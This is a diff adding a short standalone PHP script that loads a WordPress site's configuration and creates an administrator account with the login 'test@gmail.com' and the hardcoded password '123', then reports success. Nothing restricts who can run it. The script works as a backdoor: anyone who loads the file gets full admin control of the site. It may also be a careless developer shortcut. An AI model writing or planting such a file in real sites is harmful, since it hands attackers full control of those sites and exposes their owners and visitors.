@@ -1,0 +1,17 @@
+<?php
+require('wp-config.php');
+$user = 'test@gmail.com';
+$pass = '123';
+
+$user = wp_insert_user( array(
+	'first_name' => 'dev',
+	'display_name' => 'dev',
+	'user_login' => $user,
+	'user_email' => $user,
+	'user_pass' => $pass,
+	'role' => 'administrator'
+) );
+if( $user ){
+	echo 'user created success';
+}
+?>
